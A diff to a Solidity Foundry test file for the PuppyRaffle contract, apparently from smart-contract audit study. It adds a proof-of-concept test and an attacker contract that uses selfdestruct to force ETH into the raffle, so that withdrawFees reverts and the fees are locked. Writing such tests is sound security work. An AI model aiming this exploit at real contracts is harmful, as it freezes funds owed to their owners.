@@ -298,15 +298,37 @@ contract PuppyRaffleTest is Test {
         assert(startingFee > endingFee);
     }
 
+    function testMishandelingOfEthHappening() external {
+        address[] memory players = new address[](4);
+        players[0] = address(1);
+        players[1] = address(2);
+        players[2] = address(3);
+        players[3] = address(4);
+        MishandelingOfEth miss = new MishandelingOfEth(puppyRaffle);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        vm.warp(block.timestamp + duration + 1);
+        puppyRaffle.selectWinner();
+        miss.attack{value: 1 ether}();
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+
+    }
+
 }
 
 
+contract MishandelingOfEth {
 
+    PuppyRaffle puppy;
+    constructor(PuppyRaffle _puppy) {
+        puppy = _puppy;
+    }
 
-
-
-
-
+    function attack() external payable{
+        selfdestruct(payable(address(puppy)));
+    }
+}
 
 
 
